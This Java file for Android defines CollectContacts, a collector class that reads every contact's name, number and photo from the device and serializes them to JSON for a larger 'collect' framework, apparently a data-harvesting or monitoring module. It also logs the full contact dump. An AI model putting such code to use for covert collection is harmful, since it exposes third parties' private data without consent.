package com.xaviar.collect.contacts;



import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;
import com.xaviar.utils.BinUtil;

import flexjson.JSONSerializer;


public class CollectContacts extends ThreadCollector implements ICollector {

	private final static String name = "CollectContacts";
	private static final String TAG = name;
	

	public CollectContacts(Context ctx,String genericData) {
		this.genericData = genericData;
		this.ctx = ctx;
	}
	
	public CollectContacts() {	
		setName(CollectContacts.name);
	}


	public CollectContacts(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		
		Log.d(TAG,"Enter getAllData()");
		 List<ContactEntry> contacts;
		  // MAKE QUERY TO CONTACT CONTENTPROVIDER
        String[] projections = new String[] { Phone._ID, Phone.DISPLAY_NAME, Phone.NUMBER, Phone.TYPE,Phone.PHOTO_ID };
        Cursor cur =  ctx.getContentResolver().query(Phone.CONTENT_URI, projections, null, null, null);
        
        //ctx.startManagingCursor(c);

        contacts = new ArrayList<ContactEntry>();
        while (cur.moveToNext()) {
            int nameCol = cur.getColumnIndex(Phone.DISPLAY_NAME);
            int numCol = cur.getColumnIndex(Phone.NUMBER);
            int typeCol = cur.getColumnIndex(Phone.TYPE);
            int photoCol = cur.getColumnIndex(Phone.PHOTO_ID);
            int idCol = cur.getColumnIndex(Phone._ID);
          
           
            String name = cur.getString(nameCol);
            String number = cur.getString(numCol);
            int type = cur.getInt(typeCol);
            int photoId = cur.getInt(photoCol);
            String imageStr = handlePhoto(photoId);
            int id = cur.getInt(idCol);
            String idStr = String.valueOf(id);
            contacts.add(new ContactEntry(name,idStr, number, type, imageStr));
        }
        genericData =  translateContactEntityToGeneric(contacts);		
		return genericData;
	}
	
	private String handlePhoto(int photoID)
	{
		String imageStr = "";
		Bitmap bitmap = queryContactImage(photoID);
		if(null != bitmap)
		{
		 imageStr = BinUtil.encodeBitmap(bitmap,Bitmap.CompressFormat.JPEG);	
		}
     	
     	return imageStr;
	}

	private Bitmap queryContactImage(int imageDataRow) {
	    Cursor c = ctx.getContentResolver().query(ContactsContract.Data.CONTENT_URI, new String[] {
	    		 ContactsContract.CommonDataKinds.Photo.PHOTO
	    }, ContactsContract.Data._ID + "=?", new String[] {
	        Integer.toString(imageDataRow)
	    }, null);
	    byte[] imageBytes = null;
	    if (c != null) {
	        if (c.moveToFirst()) {
	            imageBytes = c.getBlob(0);
	        }
	        c.close();
	    }
	    if (imageBytes != null) {
	        return BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length); 
	    } else {
	        return null;
	    }

	}

	   

	private String translateContactEntityToGeneric(
			List<ContactEntry> contacts) {
		Log.d(TAG,"Enter translateContactEntityToGeneric()");
		int size = 0;
		if (contacts != null)
		{
		 size = contacts.size();
		 }
		String ret = toJsonArray(contacts);
		Log.d(TAG,"ret:" + ret);
		
		Log.d(TAG,"Num of contacts entry:" + size);
		return ret;
	}
	public static String toJsonArray(Collection<ContactEntry> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}

	@Override
	public String getHolderKey() {		
		return DataHolder.CONTACTS;
	}

	

}